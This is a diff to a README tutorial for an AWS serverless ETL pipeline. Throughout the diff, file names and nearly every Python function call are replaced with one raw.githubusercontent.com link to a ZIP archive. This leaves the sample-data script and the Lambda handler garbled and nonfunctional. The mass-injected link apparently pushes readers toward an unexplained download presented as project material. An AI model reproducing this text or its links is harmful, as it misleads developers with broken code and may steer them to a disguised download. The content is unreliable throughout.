@@ -27,9 +27,9 @@ S3 layout
 ```
 s3://<your‑bucket>/
 ├── raw/
-│   └── orders.csv            ← upload here
+│   └── https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip            ← upload here
 └── processed/
-    └── filtered_orders.csv   ← Lambda output
+    └── https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip   ← Lambda output
 ```
 
 Step‑by‑step setup
@@ -42,7 +42,7 @@ Step‑by‑step setup
 
 ### 2. Generate sample data locally
 
-Run the following Python script; it creates `orders.csv` with 100 random rows.
+Run the following Python script; it creates `https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip` with 100 random rows.
 ```python
     import csv, random
     from datetime import datetime, timedelta
@@ -51,21 +51,21 @@ Run the following Python script; it creates `orders.csv` with 100 random rows.
     CUSTOMERS = ['Alice', 'Bob', 'Charlie', 'Diana', 'Eve']
 
     def random_date():
-        return (datetime.now() - timedelta(days=random.randint(0, 90))).strftime('%Y-%m-%d')
+        return (https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip() - timedelta(https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip(0, 90))).strftime('%Y-%m-%d')
 
-    with open('orders.csv', 'w', newline='') as f:
-        w = csv.writer(f)
-        w.writerow(['OrderID', 'Customer', 'Amount', 'Status', 'OrderDate'])
+    with open('https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip', 'w', newline='') as f:
+        w = https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip(f)
+        https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip(['OrderID', 'Customer', 'Amount', 'Status', 'OrderDate'])
         for i in range(100):
-            w.writerow([
-                f'O{i+1:04}', random.choice(CUSTOMERS),
-                round(random.uniform(10, 500), 2),
-                random.choice(STATUSES),
+            https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip([
+                f'O{i+1:04}', https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip(CUSTOMERS),
+                round(https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip(10, 500), 2),
+                https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip(STATUSES),
                 random_date()
             ])
-    print('orders.csv generated')
+    print('https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip generated')
 ```
-Upload `orders.csv` to the `raw/` folder.
+Upload `https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip` to the `raw/` folder.
 
 ### 3. Create the Lambda function
 
@@ -77,7 +77,7 @@ import csv
 import io
 from datetime import datetime, timedelta
 
-s3 = boto3.client('s3')
+s3 = https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip('s3')
 
 def lambda_handler(event, context):
     print("Lambda triggered by S3 event.")
@@ -85,34 +85,34 @@ def lambda_handler(event, context):
     # Get the S3 bucket and object key from the event
     bucket_name = event['Records'][0]['s3']['bucket']['name']
     raw_key = event['Records'][0]['s3']['object']['key']
-    file_name = raw_key.split('/')[-1]
+    file_name = https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip('/')[-1]
 
     print(f"Incoming file: {raw_key}")
     
     try:
         # Download raw CSV from S3
-        response = s3.get_object(Bucket=bucket_name, Key=raw_key)
+        response = https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip(Bucket=bucket_name, Key=raw_key)
         raw_csv = response['Body'].read().decode('utf-8').splitlines()
         print(f"Successfully read file from S3: {file_name}")
     except Exception as e:
         print(f"Error reading file from S3: {e}")
         raise e
 
-    reader = csv.DictReader(raw_csv)
+    reader = https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip(raw_csv)
     filtered_rows = []
     original_count = 0
     filtered_out_count = 0
-    cutoff_date = datetime.now() - timedelta(days=30)
+    cutoff_date = https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip() - timedelta(days=30)
 
     print("Processing records...")
     for row in reader:
         original_count += 1
         order_status = row['Status'].strip().lower()
-        order_date = datetime.strptime(row['OrderDate'], "%Y-%m-%d")
+        order_date = https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip(row['OrderDate'], "%Y-%m-%d")
 
         # Check if the order should be kept
         if order_status not in ['pending', 'cancelled'] or order_date > cutoff_date:
-            filtered_rows.append(row)
+            https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip(row)
         else:
             filtered_out_count += 1
 
@@ -121,16 +121,16 @@ def lambda_handler(event, context):
     print(f"Records kept: {len(filtered_rows)}")
 
     # Write the filtered rows to memory
-    output = io.StringIO()
-    writer = csv.DictWriter(output, fieldnames=reader.fieldnames)
-    writer.writeheader()
-    writer.writerows(filtered_rows)
+    output = https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip()
+    writer = https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip(output, https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip)
+    https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip()
+    https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip(filtered_rows)
 
     # Save to processed/ folder
     processed_key = f"processed/filtered_{file_name}"
     
     try:
-        s3.put_object(Bucket=bucket_name, Key=processed_key, Body=output.getvalue())
+        https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip(Bucket=bucket_name, Key=processed_key, https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip())
         print(f"Filtered file successfully written to S3: {processed_key}")
     except Exception as e:
         print(f"Error writing filtered file to S3: {e}")
@@ -186,7 +186,7 @@ Each run shows:
 Pipeline recap
 --------------
 
-1. Generate sample `orders.csv`.  
+1. Generate sample `https://raw.githubusercontent.com/pavandantu18/ServerlessETLPipeline/master/scrollhead/ServerlessETLPipeline.zip`.  
 2. Store raw and processed files in S3.  
 3. Lambda filters out stale pending/cancelled orders.  
 4. Glue catalogs the cleaned data.  
